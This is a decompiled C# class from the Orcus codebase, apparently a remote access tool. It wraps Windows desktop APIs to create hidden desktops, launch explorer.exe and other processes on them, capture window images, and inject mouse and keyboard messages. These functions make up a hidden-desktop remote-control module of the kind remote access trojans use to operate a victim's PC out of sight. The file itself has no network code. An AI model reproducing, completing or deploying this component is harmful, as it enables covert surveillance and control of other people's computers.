using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Orcus.Native;

namespace Orcus.Utilities.WindowsDesktop;

public class Desktop : IDisposable, ICloneable
{
	public const int MaxWindowNameLength = 100;

	private const short SW_HIDE = 0;

	private const short SW_NORMAL = 1;

	private const int STARTF_USESTDHANDLES = 256;

	private const int STARTF_USESHOWWINDOW = 1;

	private const int UOI_NAME = 2;

	private const uint STARTF_USEPOSITION = 4u;

	private const int NORMAL_PRIORITY_CLASS = 32;

	private const uint DESKTOP_CREATEWINDOW = 2u;

	private const uint DESKTOP_ENUMERATE = 64u;

	private const uint DESKTOP_WRITEOBJECTS = 128u;

	private const uint DESKTOP_SWITCHDESKTOP = 256u;

	private const uint DESKTOP_CREATEMENU = 4u;

	private const uint DESKTOP_HOOKCONTROL = 8u;

	private const uint DESKTOP_READOBJECTS = 1u;

	private const uint DESKTOP_JOURNALRECORD = 16u;

	private const uint DESKTOP_JOURNALPLAYBACK = 32u;

	private const uint AccessRights = 511u;

	private static StringCollection m_sc;

	public static readonly Desktop Default = OpenDefaultDesktop();

	public static readonly Desktop Input = OpenInputDesktop();

	private IntPtr m_desktop;

	private string m_desktopName;

	private bool m_disposed;

	private List<IntPtr> m_windows;

	public bool IsOpen => m_desktop != IntPtr.Zero;

	public string DesktopName => m_desktopName;

	public IntPtr DesktopHandle => m_desktop;

	public DesktopActions DesktopActions { get; }

	public Desktop()
	{
		m_desktop = IntPtr.Zero;
		m_desktopName = string.Empty;
		m_windows = new List<IntPtr>();
		m_disposed = false;
		DesktopActions = new DesktopActions(this);
	}

	private Desktop(IntPtr desktop)
	{
		m_desktop = desktop;
		m_desktopName = GetDesktopName(desktop);
		m_windows = new List<IntPtr>();
		m_disposed = false;
		DesktopActions = new DesktopActions(this);
	}

	public object Clone()
	{
		CheckDisposed();
		Desktop desktop = new Desktop();
		if (IsOpen)
		{
			desktop.Open(m_desktopName);
		}
		return desktop;
	}

	public void Dispose()
	{
		Dispose(disposing: true);
		GC.SuppressFinalize(this);
	}

	~Desktop()
	{
		Close();
	}

	public bool Create(string name)
	{
		CheckDisposed();
		if (m_desktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		if (Exists(name))
		{
			return Open(name);
		}
		m_desktop = NativeMethods.CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, 511u, IntPtr.Zero);
		m_desktopName = name;
		if (m_desktop == IntPtr.Zero)
		{
			return false;
		}
		DesktopActions.Load();
		return true;
	}

	public bool Close()
	{
		CheckDisposed();
		if (m_desktop != IntPtr.Zero)
		{
			bool num = NativeMethods.CloseDesktop(m_desktop);
			if (num)
			{
				m_desktop = IntPtr.Zero;
				m_desktopName = string.Empty;
			}
			return num;
		}
		return true;
	}

	public bool Open(string name)
	{
		CheckDisposed();
		if (m_desktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		m_desktop = NativeMethods.OpenDesktop(name, 0, fInherit: true, 511u);
		if (m_desktop == IntPtr.Zero)
		{
			return false;
		}
		m_desktopName = name;
		DesktopActions.Load();
		return true;
	}

	public bool OpenInput()
	{
		CheckDisposed();
		if (m_desktop != IntPtr.Zero && !Close())
		{
			return false;
		}
		m_desktop = NativeMethods.OpenInputDesktop(0, fInherit: true, 511L);
		if (m_desktop == IntPtr.Zero)
		{
			return false;
		}
		m_desktopName = GetDesktopName(m_desktop);
		DesktopActions.Load();
		return true;
	}

	public bool Show()
	{
		CheckDisposed();
		if (m_desktop == IntPtr.Zero)
		{
			return false;
		}
		return NativeMethods.SwitchDesktop(m_desktop);
	}

	public List<Window> GetWindows()
	{
		CheckDisposed();
		if (!IsOpen)
		{
			return null;
		}
		lock (m_windows)
		{
			m_windows.Clear();
			bool num = NativeMethods.EnumDesktopWindows(m_desktop, DesktopWindowsProc, IntPtr.Zero);
			if (!num)
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
			return (!num) ? null : m_windows.Select((IntPtr wnd) => new Window(wnd)).ToList();
		}
	}

	private bool DesktopWindowsProc(IntPtr wndHandle, IntPtr lParam)
	{
		m_windows.Add(wndHandle);
		return true;
	}

	public Process CreateProcess(string path, string argument)
	{
		CheckDisposed();
		if (!IsOpen)
		{
			return null;
		}
		StringBuilder stringBuilder = BuildCommandLine(path, argument);
		STARTUPINFO lpStartupInfo = default(STARTUPINFO);
		lpStartupInfo.cb = Marshal.SizeOf((object)lpStartupInfo);
		lpStartupInfo.lpDesktop = DesktopName;
		PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
		if (!NativeMethods.CreateProcess(null, stringBuilder.ToString(), IntPtr.Zero, IntPtr.Zero, bInheritHandles: true, 32, IntPtr.Zero, null, ref lpStartupInfo, ref lpProcessInformation))
		{
			return null;
		}
		return Process.GetProcessById(lpProcessInformation.dwProcessId);
	}

	public void Prepare()
	{
		CheckDisposed();
		if (IsOpen)
		{
			CreateProcess("explorer.exe", "");
		}
	}

	public Bitmap DrawDesktop()
	{
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		List<Window> windows = GetWindows();
		if (windows == null)
		{
			return null;
		}
		Bitmap val = new Bitmap(SystemInformation.get_VirtualScreen().Width, SystemInformation.get_VirtualScreen().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			int index = windows.Count - 1;
			while (index-- > 0)
			{
				Window window = windows[index];
				if (!NativeMethods.GetWindowRect(window.Handle, out var lpRect) || lpRect.Width == 0 || lpRect.Height == 0)
				{
					continue;
				}
				Bitmap val3 = new Bitmap(lpRect.Width, lpRect.Height, (PixelFormat)925707);
				try
				{
					Graphics val4 = Graphics.FromImage((Image)(object)val3);
					try
					{
						IntPtr hdc = val4.GetHdc();
						try
						{
							if (!NativeMethods.PrintWindow(window.Handle, hdc, 0u))
							{
								continue;
							}
						}
						finally
						{
							val4.ReleaseHdc(hdc);
						}
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
					val2.DrawImage((Image)(object)val3, lpRect.X, lpRect.Y);
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			return val;
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public Bitmap DrawWindow(IntPtr handle, RECT rect)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		Bitmap val = new Bitmap(rect.Width, rect.Height, (PixelFormat)925707);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			IntPtr hdc = val2.GetHdc();
			try
			{
				if (!NativeMethods.PrintWindow(handle, hdc, 0u))
				{
					return null;
				}
				return val;
			}
			finally
			{
				val2.ReleaseHdc(hdc);
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
	}

	public Bitmap DrawWindow(IntPtr handle)
	{
		List<Window> windows = GetWindows();
		if (windows == null)
		{
			return null;
		}
		List<Window> list = windows.Where((Window x) => x.Handle == handle).ToList();
		if (list.Count == 0)
		{
			return null;
		}
		if (NativeMethods.GetWindowRect(list[0].Handle, out var lpRect) && lpRect.Width != 0 && lpRect.Height != 0)
		{
			return DrawWindow(handle, lpRect);
		}
		return null;
	}

	public KeyValuePair<Window, RECT> GetWindowAtPosition(int x, int y)
	{
		foreach (Window window in GetWindows())
		{
			if (NativeMethods.GetWindowRect(window.Handle, out var lpRect) && lpRect.Width != 0 && lpRect.Height != 0 && x >= lpRect.Left && x <= lpRect.Right && y >= lpRect.Top && y <= lpRect.Bottom)
			{
				return new KeyValuePair<Window, RECT>(window, lpRect);
			}
		}
		return default(KeyValuePair<Window, RECT>);
	}

	public void PostMessage(int x, int y, WM msg, IntPtr wparam, IntPtr lparam)
	{
		List<Window> windows = GetWindows();
		int index = windows.Count - 1;
		Window window;
		RECT lpRect;
		do
		{
			if (index-- > 0)
			{
				window = windows[index];
				continue;
			}
			return;
		}
		while (!NativeMethods.GetWindowRect(window.Handle, out lpRect) || lpRect.Width == 0 || lpRect.Height == 0 || x < lpRect.Left || x > lpRect.Right || y < lpRect.Top || y > lpRect.Bottom);
		NativeMethods.PostMessage(new HandleRef(null, window.Handle), msg, wparam, lparam);
	}

	public void PostMessage(WM msg, IntPtr wparam, IntPtr lparam)
	{
		foreach (Window window in GetWindows())
		{
			if (NativeMethods.GetWindowRect(window.Handle, out var lpRect) && lpRect.Width != 0 && lpRect.Height != 0)
			{
				NativeMethods.PostMessage(new HandleRef(null, window.Handle), msg, wparam, lparam);
				break;
			}
		}
	}

	public static string[] GetDesktops()
	{
		IntPtr processWindowStation = NativeMethods.GetProcessWindowStation();
		if (processWindowStation == IntPtr.Zero)
		{
			return new string[0];
		}
		lock (m_sc = new StringCollection())
		{
			if (!NativeMethods.EnumDesktops(processWindowStation, DesktopProc, IntPtr.Zero))
			{
				return new string[0];
			}
			string[] array = new string[m_sc.Count];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = m_sc[i];
			}
			return array;
		}
	}

	private static bool DesktopProc(string lpszDesktop, IntPtr lParam)
	{
		m_sc.Add(lpszDesktop);
		return true;
	}

	public static bool Show(string name)
	{
		bool flag = false;
		using Desktop desktop = new Desktop();
		if (!(flag = desktop.Open(name)))
		{
			return false;
		}
		return desktop.Show();
	}

	public static Desktop GetCurrent()
	{
		return new Desktop(NativeMethods.GetThreadDesktop(Thread.CurrentThread.ManagedThreadId));
	}

	public static bool SetCurrent(Desktop desktop)
	{
		if (!desktop.IsOpen)
		{
			return false;
		}
		return NativeMethods.SetThreadDesktop(desktop.DesktopHandle);
	}

	public static Desktop OpenDesktop(string name)
	{
		Desktop desktop = new Desktop();
		if (!desktop.Open(name))
		{
			return null;
		}
		return desktop;
	}

	public static Desktop OpenInputDesktop()
	{
		Desktop desktop = new Desktop();
		if (!desktop.OpenInput())
		{
			return null;
		}
		return desktop;
	}

	public static Desktop OpenDefaultDesktop()
	{
		return OpenDesktop("Default");
	}

	public static Desktop CreateDesktop(string name)
	{
		Desktop desktop = new Desktop();
		if (!desktop.Create(name))
		{
			return null;
		}
		return desktop;
	}

	public static string GetDesktopName(Desktop desktop)
	{
		if (desktop.IsOpen)
		{
			return null;
		}
		return GetDesktopName(desktop.DesktopHandle);
	}

	public static string GetDesktopName(IntPtr desktopHandle)
	{
		if (desktopHandle == IntPtr.Zero)
		{
			return null;
		}
		int lpnLengthNeeded = 0;
		string empty = string.Empty;
		NativeMethods.GetUserObjectInformation(desktopHandle, 2, IntPtr.Zero, 0, ref lpnLengthNeeded);
		IntPtr intPtr = Marshal.AllocHGlobal(lpnLengthNeeded);
		bool userObjectInformation = NativeMethods.GetUserObjectInformation(desktopHandle, 2, intPtr, lpnLengthNeeded, ref lpnLengthNeeded);
		empty = Marshal.PtrToStringAnsi(intPtr);
		Marshal.FreeHGlobal(intPtr);
		if (!userObjectInformation)
		{
			return null;
		}
		return empty;
	}

	public static bool Exists(string name)
	{
		return Exists(name, caseInsensitive: false);
	}

	public static bool Exists(string name, bool caseInsensitive)
	{
		string[] desktops = GetDesktops();
		int num = 0;
		while (true)
		{
			if (num < desktops.Length)
			{
				string text = desktops[num];
				if (caseInsensitive)
				{
					if (text.ToLower() == name.ToLower())
					{
						return true;
					}
				}
				else if (text == name)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	public static Process CreateProcessOnDesktop(string path, string desktop)
	{
		if (!Exists(desktop))
		{
			return null;
		}
		return OpenDesktop(desktop).CreateProcess(path, null);
	}

	public static Process[] GetInputProcesses()
	{
		Process[] processes = Process.GetProcesses();
		ArrayList arrayList = new ArrayList();
		string desktopName = GetDesktopName(Input.DesktopHandle);
		Process[] array = processes;
		foreach (Process process in array)
		{
			foreach (ProcessThread thread in process.Threads)
			{
				if (GetDesktopName(NativeMethods.GetThreadDesktop(thread.Id)) == desktopName)
				{
					arrayList.Add(process);
					break;
				}
			}
		}
		Process[] array2 = new Process[arrayList.Count];
		for (int j = 0; j < array2.Length; j++)
		{
			array2[j] = (Process)arrayList[j];
		}
		return array2;
	}

	public virtual void Dispose(bool disposing)
	{
		if (!m_disposed)
		{
			Close();
		}
		m_disposed = true;
	}

	private void CheckDisposed()
	{
		if (m_disposed)
		{
			throw new ObjectDisposedException("");
		}
	}

	public override string ToString()
	{
		return m_desktopName;
	}

	private static StringBuilder BuildCommandLine(string executableFileName, string arguments)
	{
		StringBuilder stringBuilder = new StringBuilder();
		string text = executableFileName.Trim();
		int num;
		if (text.StartsWith("\"", StringComparison.Ordinal))
		{
			num = (text.EndsWith("\"", StringComparison.Ordinal) ? 1 : 0);
			if (num != 0)
			{
				goto IL_0039;
			}
		}
		else
		{
			num = 0;
		}
		stringBuilder.Append("\"");
		goto IL_0039;
		IL_0039:
		stringBuilder.Append(text);
		if (num == 0)
		{
			stringBuilder.Append("\"");
		}
		if (!string.IsNullOrEmpty(arguments))
		{
			stringBuilder.Append(" ");
			stringBuilder.Append(arguments);
		}
		return stringBuilder;
	}
}
